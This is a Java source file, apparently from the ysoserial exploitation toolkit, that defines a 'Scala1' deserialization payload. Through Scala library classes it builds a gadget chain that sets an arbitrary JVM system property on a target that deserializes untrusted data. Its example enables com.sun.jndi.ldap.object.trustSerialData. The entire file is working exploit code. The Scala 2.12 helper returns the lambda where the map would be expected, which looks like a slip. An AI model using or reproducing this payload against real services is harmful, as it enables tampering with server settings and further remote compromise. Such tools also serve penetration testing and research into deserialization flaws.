package ysoserial.payloads;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.ObjectStreamClass;
import java.lang.invoke.SerializedLambda;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Properties;
import java.util.concurrent.ConcurrentSkipListMap;
import scala.Array;
import scala.Function0;
import scala.Function1;
import scala.None$;
import scala.Option;
import scala.Tuple2;
import scala.math.Ordering;
import scala.reflect.ClassTypeManifest;
import scala.sys.SystemProperties;
import sun.reflect.ReflectionFactory;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.StubClassConstructor;

@Dependencies({"org.scala-lang:scala-library:2.13.6  修改SystemProperties的值。 eg: com.sun.jndi.ldap.object.trustSerialData#true"})
@Authors({"artsploit"})
public class Scala1 extends PayloadRunner implements ObjectPayload<Object> {
    private static Object createFuncFromSerializedLambda(SerializedLambda serialized) throws IOException, ClassNotFoundException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(serialized);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(baos.toByteArray()));
        return ois.readObject();
    }

    private static Object createSetSystemPropertyGadgetScala213(String key, String value) throws Exception {
        ReflectionFactory rf = ReflectionFactory.getReflectionFactory();
        Tuple2 prop = new Tuple2(key, value);
        long versionUID = ObjectStreamClass.lookup(Tuple2.class).getSerialVersionUID();
        System.out.println("VersionUID: " + versionUID);
        SerializedLambda lambdaSetSystemProperty = new SerializedLambda(SystemProperties.class, "scala/Function0", "apply", "()Ljava/lang/Object;", 6, "scala.sys.SystemProperties", "$anonfun$addOne$1", "(Lscala/Tuple2;)Ljava/lang/String;", "()Lscala/sys/SystemProperties;", new Object[] { prop });
        Class<?> clazz = Class.forName("scala.collection.View$Fill");
        Constructor<?> ctor = clazz.getConstructor(new Class[] { int.class, Function0.class });
        Object view = ctor.newInstance(new Object[] { Integer.valueOf(1), createFuncFromSerializedLambda(lambdaSetSystemProperty) });
        clazz = Class.forName("scala.math.Ordering$IterableOrdering");
        ctor = rf.newConstructorForSerialization(clazz, StubClassConstructor.class
            .getDeclaredConstructor(new Class[0]));
        Object iterableOrdering = ctor.newInstance(new Object[0]);
        ConcurrentSkipListMap<Object, Object> map = new ConcurrentSkipListMap<>((o1, o2) -> 1);
        map.put(view, Integer.valueOf(1));
        map.put(view, Integer.valueOf(2));
        Field f = map.getClass().getDeclaredField("comparator");
        f.setAccessible(true);
        f.set(map, iterableOrdering);
        return map;
    }

    static Object createSetSystemPropertyGadgetScala212(String key, String value) throws Exception {
        ReflectionFactory rf = ReflectionFactory.getReflectionFactory();
        Tuple2 prop = new Tuple2(key, value);
        SerializedLambda lambdaSetSystemProperty = new SerializedLambda(SystemProperties.class, "scala/Function0", "apply", "()Ljava/lang/Object;", 6, "scala.sys.SystemProperties", "$anonfun$$plus$eq$1", "(Lscala/Tuple2;)Ljava/lang/String;", "()Lscala/sys/SystemProperties;", new Object[] { prop });
        SerializedLambda lambdaWrapFn1ToFn0 = new SerializedLambda(Array.class, "scala/Function1", "apply", "(Ljava/lang/Object;)Ljava/lang/Object;", 6, "scala.Array$", "$anonfun$fill$1$adapted", "(ILscala/Function0;Lscala/reflect/ClassTag;Ljava/lang/Object;)Ljava/lang/Object;", "(Ljava/lang/Object;)[Ljava/lang/Object;", new Object[] { Integer.valueOf(1), lambdaSetSystemProperty, new ClassTypeManifest((Option)None$.MODULE$, Object.class, null) });
        Class<?> clazz = Class.forName("scala.math.Ordering$$anon$5");
        Constructor<?> ctor = clazz.getConstructor(new Class[] { Ordering.class, Function1.class });
        ctor = rf.newConstructorForSerialization(clazz, StubClassConstructor.class
            .getDeclaredConstructor(new Class[0]));
        Ordering<?> ordering = (Ordering)ctor.newInstance(new Object[0]);
        Field f = ordering.getClass().getDeclaredField("f$2");
        f.setAccessible(true);
        f.set(ordering, createFuncFromSerializedLambda(lambdaWrapFn1ToFn0));
        ConcurrentSkipListMap<Integer, Integer> map = new ConcurrentSkipListMap<>();
        map.put(Integer.valueOf(1), Integer.valueOf(1));
        map.put(Integer.valueOf(2), Integer.valueOf(2));
        f = map.getClass().getDeclaredField("comparator");
        f.setAccessible(true);
        f.set(map, ordering);
        return lambdaSetSystemProperty;
    }

    public Object getObject(String command) throws Exception {
        String[] nameValue = command.split("#");
        return createSetSystemPropertyGadgetScala213(nameValue[0], nameValue[1]);
    }

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(Scala1.class, new String[]{"com.sun.jndi.ldap.object.trustSerialData#true"});
    }
}
